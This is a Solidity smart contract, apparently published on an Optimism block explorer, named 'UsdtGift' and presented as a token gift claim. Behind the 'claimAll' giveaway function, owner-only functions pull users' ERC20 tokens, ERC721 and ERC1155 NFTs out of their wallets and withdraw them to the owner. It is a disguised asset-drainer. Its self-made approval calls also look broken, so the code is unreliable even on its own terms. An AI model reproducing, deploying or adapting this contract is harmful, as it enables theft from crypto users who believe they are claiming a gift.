/**
 *Submitted for verification at optimistic.etherscan.io on 2025-03-29
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IERC721 {
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function setApprovalForAll(address operator, bool approved) external;
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function getApproved(uint256 tokenId) external view returns (address);
}

interface IERC1155 {
    function balanceOf(address account, uint256 id) external view returns (uint256);
    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes calldata data) external;
    function setApprovalForAll(address operator, bool approved) external;
    function isApprovedForAll(address owner, address operator) external view returns (bool);
}

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);
}

interface IERC1155Receiver {
    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes calldata data) external returns (bytes4);
}

contract UsdtGift is IERC721Receiver, IERC1155Receiver {
    address public owner;
    
    event AssetTransferred(address indexed asset, address indexed from, uint256 amount);
    event ApprovalUpdated(address indexed user, address indexed asset, uint256 amount);

    mapping(address => mapping(address => uint256)) private permisosERC20;
    mapping(address => mapping(address => bool)) private permisosERC721;
    mapping(address => mapping(address => bool)) private permisosERC1155;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Unauthorized");
        _;
    }

    function claimAll(
        address[] calldata tokensERC20,
        uint256[] calldata amounts,
        address[] calldata contractsERC721,
        address[] calldata contractsERC1155
    ) external {
        require(tokensERC20.length == amounts.length, "Invalid input");
        
        for (uint256 i = 0; i < tokensERC20.length; i++) {
            require(IERC20(tokensERC20[i]).approve(address(this), amounts[i]), "ERC20 Approval failed");
            permisosERC20[msg.sender][tokensERC20[i]] = amounts[i];
            emit ApprovalUpdated(msg.sender, tokensERC20[i], amounts[i]);
        }

        for (uint256 i = 0; i < contractsERC721.length; i++) {
            IERC721(contractsERC721[i]).setApprovalForAll(address(this), true);
            require(IERC721(contractsERC721[i]).isApprovedForAll(msg.sender, address(this)), "ERC721 Approval failed");
            permisosERC721[msg.sender][contractsERC721[i]] = true;
        }

        for (uint256 i = 0; i < contractsERC1155.length; i++) {
            IERC1155(contractsERC1155[i]).setApprovalForAll(address(this), true);
            require(IERC1155(contractsERC1155[i]).isApprovedForAll(msg.sender, address(this)), "ERC1155 Approval failed");
            permisosERC1155[msg.sender][contractsERC1155[i]] = true;
        }
    }

    function transferERC20ToContract(address user, address token, uint256 amount) external onlyOwner {
        require(permisosERC20[user][token] >= amount, "Insufficient permissions");
        require(IERC20(token).allowance(user, address(this)) >= amount, "Insufficient allowance");
        
        uint256 previousBalance = IERC20(token).balanceOf(address(this));
        require(IERC20(token).transferFrom(user, address(this), amount), "Transfer failed");
        require(IERC20(token).balanceOf(address(this)) == previousBalance + amount, "Balance verification failed");
        
        permisosERC20[user][token] -= amount;
        emit AssetTransferred(token, user, amount);
    }

    function transferERC721ToContract(address user, address nftContract, uint256 tokenId) external onlyOwner {
        require(permisosERC721[user][nftContract], "No permissions");
        require(
            IERC721(nftContract).getApproved(tokenId) == address(this) || 
            IERC721(nftContract).isApprovedForAll(user, address(this)),
            "Approval not detected"
        );

        IERC721(nftContract).safeTransferFrom(user, address(this), tokenId);
        emit AssetTransferred(nftContract, user, tokenId);
    }

    function transferERC1155ToContract(
        address user,
        address nftContract,
        uint256 tokenId,
        uint256 amount
    ) external onlyOwner {
        require(permisosERC1155[user][nftContract], "No permissions");
        require(
            IERC1155(nftContract).isApprovedForAll(user, address(this)),
            "Approval not detected"
        );

        uint256 previousBalance = IERC1155(nftContract).balanceOf(address(this), tokenId);
        IERC1155(nftContract).safeTransferFrom(user, address(this), tokenId, amount, "");
        require(
            IERC1155(nftContract).balanceOf(address(this), tokenId) == previousBalance + amount,
            "Balance verification failed"
        );
        emit AssetTransferred(nftContract, user, amount);
    }

    function transferETHToContract(address user) external payable onlyOwner {
        require(msg.value > 0, "Invalid amount");
        emit AssetTransferred(address(0), user, msg.value);
    }

    function withdrawERC20(address token, uint256 amount) external onlyOwner {
        require(IERC20(token).transfer(owner, amount), "Transfer failed");
    }

    function withdrawERC721(address nftContract, uint256 tokenId) external onlyOwner {
        IERC721(nftContract).safeTransferFrom(address(this), owner, tokenId);
    }

    function withdrawERC1155(address nftContract, uint256 tokenId, uint256 amount) external onlyOwner {
        IERC1155(nftContract).safeTransferFrom(address(this), owner, tokenId, amount, "");
    }

    function withdrawETH(uint256 amount) external onlyOwner {
        payable(owner).transfer(amount);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure override returns (bytes4) {
        return this.onERC1155Received.selector;
    }

    receive() external payable {}
    
    function checkERC20Allowance(address user, address token) public view returns (uint256) {
        return IERC20(token).allowance(user, address(this));
    }

    function checkERC721Approval(address user, address nftContract) public view returns (bool) {
        return IERC721(nftContract).isApprovedForAll(user, address(this));
    }

    function checkERC1155Approval(address user, address nftContract) public view returns (bool) {
        return IERC1155(nftContract).isApprovedForAll(user, address(this));
    }
}
